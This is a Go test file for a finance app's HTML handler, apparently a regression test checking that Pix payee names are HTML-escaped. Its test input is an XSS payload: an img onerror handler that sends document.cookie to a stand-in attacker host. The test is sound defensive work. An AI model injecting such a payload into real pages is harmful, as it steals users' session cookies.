package handler

import (
	"strings"
	"testing"
)

// Descricao de Pix e escrita por quem paga e vira nome de receita quando a
// transacao e convertida. Antes desta correcao o nome ia cru para o HTML.
func TestSugestoesDeVinculo_EscapaNomeVindoDeTransacaoBancaria(t *testing.T) {
	const nomeMalicioso = `PIX <img src=x onerror="fetch('//atacante/'+document.cookie)">`

	casos := []struct {
		nome   string
		grupos []grupoDeSugestoes
	}{
		{"despesa", []grupoDeSugestoes{{Titulo: "Despesas", Sugestoes: []sugestaoDeVinculo{
			{Destino: "despesa", ID: 7, Nome: nomeMalicioso, Valor: 80, Score: 90},
		}}}},
		{"receita", []grupoDeSugestoes{{Sugestoes: []sugestaoDeVinculo{
			{Destino: "receita", ID: 9, Nome: nomeMalicioso, Valor: 150.5, Score: 75},
		}}}},
	}
	for _, caso := range casos {
		t.Run(caso.nome, func(t *testing.T) {
			var saida strings.Builder
			if err := escreverSugestoesDeVinculo(&saida, 42, caso.grupos); err != nil {
				t.Fatalf("escrever: %v", err)
			}
			html := saida.String()

			if strings.Contains(html, "<img") {
				t.Fatalf("o nome entrou no HTML sem escape:\n%s", html)
			}
			if !strings.Contains(html, "&lt;img") {
				t.Errorf("o nome nao aparece escapado:\n%s", html)
			}
			// O formulario continua apontando para a transacao e o registro certos.
			if !strings.Contains(html, `action="/transacoes/42/vincular"`) {
				t.Errorf("formulario sem a acao da transacao 42:\n%s", html)
			}
		})
	}
}

func TestSugestoesDeVinculo_AvisaQuandoNaoHaSugestao(t *testing.T) {
	var saida strings.Builder
	grupos := []grupoDeSugestoes{{Titulo: "Despesas"}, {Titulo: "Parcelamentos"}}
	if err := escreverSugestoesDeVinculo(&saida, 1, grupos); err != nil {
		t.Fatalf("escrever: %v", err)
	}
	if !strings.Contains(saida.String(), "Nenhum match encontrado.") {
		t.Errorf("sem sugestoes, a lista deveria avisar:\n%s", saida.String())
	}
	if strings.Contains(saida.String(), "<h4>") {
		t.Errorf("grupo vazio nao deveria mostrar titulo:\n%s", saida.String())
	}
}
